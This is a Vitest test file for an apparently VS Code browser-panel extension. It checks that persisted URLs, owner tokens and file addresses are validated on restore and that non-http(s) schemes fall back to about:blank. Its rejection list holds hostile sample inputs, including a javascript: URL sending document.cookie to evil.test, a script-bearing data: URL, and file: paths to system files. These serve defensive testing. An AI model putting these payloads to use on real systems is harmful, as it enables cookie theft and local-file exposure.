import { describe, it, expect } from 'vitest';
import { readFileSync } from 'fs';
import { join } from 'path';
import { restoredBrowserFile, restoredBrowserOwner, restoredBrowserUrl } from '../extension';

describe('S8 — a restored URL that is not http/https is not navigated to', () => {
  it('rejects every non-http(s) scheme and falls back to about:blank', () => {
    // The panel persists every PAGE-CONTROLLED url via vscode.setState, so a hostile page can plant
    // any of these and have it navigated on the next window reload.
    for (const url of [
      'file:///c:/Windows/System32/drivers/etc/hosts',
      'vscode-file://vscode-app/etc/passwd',
      'javascript:fetch("http://evil.test?c="+document.cookie)',
      'data:text/html,<script>alert(1)</script>',
      'chrome://settings',
      'about:config',
      'ftp://evil.test/x',
      'HTTPS\u200b://not-really.test',
    ]) {
      expect(restoredBrowserUrl({ url })).toBe('about:blank');
    }
  });

  it('passes http and https through unchanged, including ports, paths and queries', () => {
    for (const url of [
      'http://example.test/',
      'https://example.test/deep/path?q=1&r=2#frag',
      'http://127.0.0.1:3000/app',
      'https://user:pass@example.test/',
    ]) {
      expect(restoredBrowserUrl({ url })).toBe(url);
    }
  });

  it('never throws on a malformed, missing or non-string url', () => {
    for (const state of [null, undefined, {}, { url: '' }, { url: 'not a url' }, { url: 42 }, { url: {} }, 'nonsense', []]) {
      expect(restoredBrowserUrl(state)).toBe('about:blank');
    }
  });

  it('reads the chat token the page saved, and nothing that is not a well-formed token', () => {
    const owner = '6f1c2b8e-3d4a-4f5b-9c6d-7e8f9a0b1c2d';
    expect(restoredBrowserOwner({ url: 'https://example.test/', owner })).toBe(owner);
    for (const state of [null, undefined, {}, { url: 'https://example.test/' }, { owner: '' }, { owner: 'not-a-token' }, { owner: `${owner} ` }, { owner: 42 }, { owner: {} }, 'nonsense', []]) {
      expect(restoredBrowserOwner(state)).toBeUndefined();
    }
  });

  it('reads the file: address a served page saved, and nothing that is not a file: address', () => {
    const file = 'file:///home/u/proj/docs/a.html';
    expect(restoredBrowserFile({ url: 'http://x.localhost:5000/docs/a.html', file })).toBe(file);
    for (const state of [null, undefined, {}, { file: '' }, { file: 'https://example.test/' }, { file: 'javascript:alert(1)' }, { file: 'not a url' }, { file: 42 }, 'nonsense', []]) {
      expect(restoredBrowserFile(state)).toBeUndefined();
    }
  });

  it('the deserializer routes the persisted state through the validator, not through `|| about:blank`', () => {
    const src = readFileSync(join(__dirname, '..', 'extension.ts'), 'utf8');
    const deserializer = src.slice(src.indexOf('damocles-browser-view'));

    expect(deserializer).toContain('restoredBrowserUrl');
    expect(deserializer.slice(0, 600)).toContain('restoredBrowserOwner(state)');
    expect(deserializer.slice(0, 600)).toContain('restoredBrowserFile(state)');
    // The pre-slice check was `(state as {url?: string})?.url || 'about:blank'` — a scheme-blind
    // truthiness test. It must not survive alongside the validator.
    expect(deserializer.slice(0, 600)).not.toMatch(/\?\.url\s*\|\|\s*['"]about:blank['"]/);
  });
});
